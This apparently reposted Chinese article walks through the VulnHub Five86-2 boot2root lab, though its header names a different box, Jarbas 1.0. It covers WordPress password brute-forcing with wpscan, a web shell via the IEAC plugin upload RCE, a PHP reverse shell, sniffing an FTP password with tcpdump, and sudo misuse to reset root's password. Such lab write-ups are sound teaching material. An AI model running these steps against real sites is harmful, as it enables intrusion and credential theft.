> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NJyIdw73SVpq8cYmlbe25g)

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9Lenf7an2sf098pVucEcKNqIrmiaEpqDdT2yYibEbtIsQeOqJOiapQtSOtiaFyndgtZRHPj6mXcgJXspLg/640?wx_fmt=gif)

喜欢就关注我吧，订阅更多最新消息

  

VulnHub 渗透测试实战靶场 Jarbas 1.0

https://www.hetianlab.com/expc.do?ec=ECIDfe8c-5c48-41ae-be67-6728d2ae15b2&pk_campaign=weixin-wemedia     

Jarbas1.0 是一个难度为初级的 Boot2root/CTF 挑战，实验目的是获取目标 root shell 得到 flag。

上篇指路 -[Vulnhub 靶机 Five86-1 详细解析](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652869932&idx=1&sn=5586c8eeab29d8f53078c9cb88fc7c81&chksm=bd59e9e18a2e60f71b889641c483d947c1c944c60fecbeb4b913f06bda4492ea6374832130c1&scene=21#wechat_redirect)  

靶机地址：http://www.vulnhub.com/entry/five86-2,418/ 

**技术点总结**

• 对 WordPress 网站的渗透 

–wpscan 

•WordPress 中 IEAC 插件的 RCE 漏洞 

–WordPress 插件 IEAC 漏洞分析及组合利用尝试

•tcpdump 的使用 

–tcpdump 使用详解 

**目标发现** 

nmap -sP 参数使用 ping 扫描局域网主机，目的地址为 192.168.56.6

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42hgl9PrCC85h5Xa1nZibhX4jF5U8ndaibST8tZ1aEicFOm9QkbKricrpaeg/640?wx_fmt=png)

nmap -A 192.168.56.6 -p- 可以看到目标主机的一些信息，-A 是进行操作系统指纹和版本检测，-p- 是全端口

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42dCib1cHTXtgicohoKDaicOeIUqicNZpibqhqHibUPKnXgqVfuwbNmH3ia4DQg/640?wx_fmt=png)

开放了 22、21、80 端口，并且 80 端口是 WordPress 5.1.4 的 CMS 这里最好提前在 / etc/hosts 中加上 192.168.56.6 five86-2 这一条，因为后面访问 wordpress 的后台 wp-admin 时会跳转到到这个域名

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42LFbq3aST25zanuqGuU13Dzjfu6GiaFByLa7XVtHI3kZn784aY4XNZhA/640?wx_fmt=png)

**漏洞发现与利用** 

在 searchsploit 和 Google 并没有发现 WordPress 5.1.4 的漏洞，可以用 wpscan 扫描一下这个 URL。wpscan 是一款针对 WordPress 的扫描器，详细的使用可以参考 WPScan 使用完整攻略。

默认扫描会返回目标站点的中间件、XML-RPC、readme 文件、上传路径、WP-Corn、版本、主题、所有的插件和备份文件。 

命令 wpscan -u http://192.168.56.6/

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv4257riaYgZx7F6l1icLk5YQPQ1VKUVZSOCfH66KHSYa57rcq1kh3gibA7AQ/640?wx_fmt=png)

这里并没有发现很有用的信息，考虑去枚举用户名，然后配合 rockyou.txt 去爆破密码。爆破用户名命令 wpscan --url http://192.168.56.6/ --enumerate u，发现了 5 个用户

```
peter
 admin 
barney 
gillian 
stephen
```

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42MxHvibdbI1wE4qSaxPZRg6IXzibbBUROVD3jvfdcmxiaSsEQaeCQX5WAg/640?wx_fmt=png)

爆破密码命令 wpscan --url http://192.168.56.6/ -U user.txt -P /usr/share/wordlists/rockyou.txt

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42q3MXh65ZD0JHlCxRvDHjchKPmU77EgAYLw7KrUtqb3D0ZTnsk0uPrg/640?wx_fmt=png)

最终爆破出来两个结果

Username: barney, Password: spooky1  
Username: stephen, Password: apollo1

使用 barney 登录后台 http://five86-2/wp-admin/，可以看到这个站点安装了三个插件，但是只激活了一个 Insert or Embed Articulate Content into WordPress Trial（IEAC）

Akismet Anti-Spam    Version 4.1.1  
Hello Dolly          Version 1.7.1  
IEAC                 Version 4.2995

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42mERfCNic1fHdGraskR5qfATibafqwY2f15ARj666oX9iaoqlZmwmTDhww/640?wx_fmt=png)

在谷歌上搜索一下，不难搜到这个插件的 RCE：WordPress 插件 IEAC 漏洞分析及组合利用尝试，在 exploit-db 上也有

先生成 poc.zip，

echo "hello" > index.html  
echo "" > index.php  
zip poc.zip index.html index.php

然后登录 wordpress 后台，选择新建文章

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42AgEO2iaPGtZicWeSulqkyicoEspIibFsIUg0NB4MWVfrWVKxrDRXPCysMg/640?wx_fmt=png)

选择添加区块

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42ib3twS8Sia8OJ8eyy6icIT1PyibdOw0emut6icQdjmrpba5LLVUxwdoiaaAg/640?wx_fmt=png)

选择 E-Learning

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv4233LVcr6WDGwuZpXFJicfNiashb6nWUtrofl8PxQLSNF7J1113LjHYqVw/640?wx_fmt=png)

上传 poc.zip

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42nLIXvDdPkDvj2icOcvvMicX6fYe9qDOZeM0m8hbEJjCicVEj2RPmibmDicw/640?wx_fmt=png)

选择 Insert As iFrame

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42hsdQwCTpKBpM2jdrfoN3no6A5FCLrXCQORpFBAS93SyHGvBkKdowZQ/640?wx_fmt=png)

可以看到上传的位置，也就是说上次的 shell 位置为

http://192.168.56.6/wp-content/uploads/articulate_uploads/poc/index.php

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42p337eKq5hf5BAyoaeGRHV4fkxIUibOShww3ic10E5E0zv0hPhiaDA8ORw/640?wx_fmt=png)

测试 shellhttp://192.168.56.6/wp-content/uploads/articulate_uploads/poc/index.php?cmd=whoami 这就拿到了 shell

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv4297obH9tD9uJciahlp1p4bgQjMW2btzRY39d144SBR1WF4l2I5CsxrXQ/640?wx_fmt=png)

使用 php-reverse-shell 去反弹 shell，访问

http://192.168.56.6/wp-content/uploads/articulate_uploads/poc4/shell.php

就可以看到反弹的 shell，还不是 TTY，接下来就想办法变成 TTY 吧

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42ETmJY2wPL1uY6BrEeUkE0Vs6o33W67aLUYLSxdyXfwQwNyWIrrzqVQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42jcxmricf47O6dkficdk8ocJZVSBIMJzv2ENzqoHzWb29oNdOW9RhPy1A/640?wx_fmt=png)

ls /home 发现有 8 个目录，刚刚爆破来两个密码，一个登陆了后台，还有一个没有测试，并且两个都在这 8 个用户里面。可以先试试 su barney，密码填 spooky1，发现失败，再试试 stephen，密码 apollo1。这里的 shell 不知道为什么没有前面的 $ 了，但是可以用

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42PZSibdZze7sEPYJcicDNNxQeVKOpiaD73IibRoXEibjkOrpzDHGbW1YbsXw/640?wx_fmt=png)

实际上，这里的 www-data 可以直接使用 python3 -c 'import pty;pty.spawn("/bin/bash")'变成 TTY，这样可能更方便一些

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42BcRao4J7flRqvvd2HcUEYErib8Uujh7EEBlCwVniagmn7EAHpU5jAGzw/640?wx_fmt=png)

然后再 sudo -l 发现需要密码，并且不是 spooky1，所以还是 su stephen 吧，发现 stephen 在一个名为 pcap 的用户组中（pcap 不是流量包吗 ^_^）

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42xzb06JAXcoZwbpY52p606RXzbKxlrVvJ4RDzPD3UUC58ibqI0KSELsQ/640?wx_fmt=png)

然后 sudo -l 发现无法执行 sudo

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42tKR6oyD2TRp4tjDOzCVh0RoamWeiaZC4kHo4J7bDhWxlqTrkAuic0Y1w/640?wx_fmt=png)

回到 pcap 那里，流量包是不是意味着流量分析，尝试 ifconfig 发现没有这个命令，但是可以使用 ip add，发现目前运行着几个网络接口

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42R5VYVTINbYCb3KaN89Fia483ia2pibOxed2NicGg6Xc5m8WtuZbZweMSvQ/640?wx_fmt=png)

这里的最后一个接口好像是动态的，每次都不一样，可以使用 tcpdump -D 列出可用于抓包的接口。这里选择把后面两个抓下来，因为不怎么常见。抓包命令为 timeout 120 tcpdump -w 1.pcap -i veth2c37c59，其中 timeout 120 是指 2 分钟，-w 是将结果输出到文件，-i 是指定监听端口

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42K1ib1YyQgXNToq1SlW7iblsLlPq9AgegLrG8sKCSmlmibHYVpicFMbkUBw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42pg0viajmF2mxU6dxQCPkffS1vgesHPnCuibD19vkllYkGkqNCttshgLw/640?wx_fmt=png)

可以去分析一下这两个流量包，命令 tcpdump -r 1.pcap，这里 - r 是从给定的流量包读取数据，不难发现 paul 用户 FTP 的密码 esomepasswford。后面 2.pcap 与 1.pcap 内容相同。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv422vtTQ3sEk7W08dtxGKwRs3dUqdkWFcwSxZY96icyQtwcibMibRjK2b4nA/640?wx_fmt=png)

接着 su paul，用上面的那个密码发现可以登陆。尝试 sudo -l 发现 stephen 可以使用 peter 的 service 命令

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42OLib4BBwja5nuQWrF951KRERtqW0GlRib7N5JCMNKntleN3ibgwsHfImg/640?wx_fmt=png)

那不就可以直接执行 peter 的 /bin/bash 了吗。命令 sudo -u peter service /bin/bash。这里要注意一下目录的问题，用相对目录找到 /bin/bash 的位置

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42QL5odoham3Ef4MqiaJhEfxbhb6ClvI7YiaUldfDib5zARpoVGKhYvBVmA/640?wx_fmt=png)

获取 peter 的权限后，还是先 sudo -l，发现他可以运行 root 用户的 passwd 命令，这我直接修改 root 的密码不就获取 root 权限了吗

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv427NicfEMXLoiccz7xSzicaWhIZSkIxQn04QhhvxrCFd7BsDErWaQ4CUPMw/640?wx_fmt=png)

是时候表演真正的技术了。sudo -u root passwd root(强迫症，全文一致)，用 sudo passwd root 一样的

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42xYF76cibE6YF1meCZsV25Knl4qrApHH4GNGD3qj1nuBqaRP0wDB9mbQ/640?wx_fmt=png)

找到 flag

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcxLJJaL4KVnvlphPicvVv42KL3RA46RngSd3zyvvYoEHNaFtLWKiciaCBD2JHE3MVTZgDVaYYiasAukg/640?wx_fmt=png)

**1/21**

欢迎投稿至邮箱：**EDU@antvsion.com**

有才能的你快来投稿吧！

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDH643dgKUQ7JK7bkJibUEk8bImjXrQgvtr4MZpMnfVuw7aT2KRkdFJrw/640?wx_fmt=gif)

快戳 “阅读原文” 做靶场练习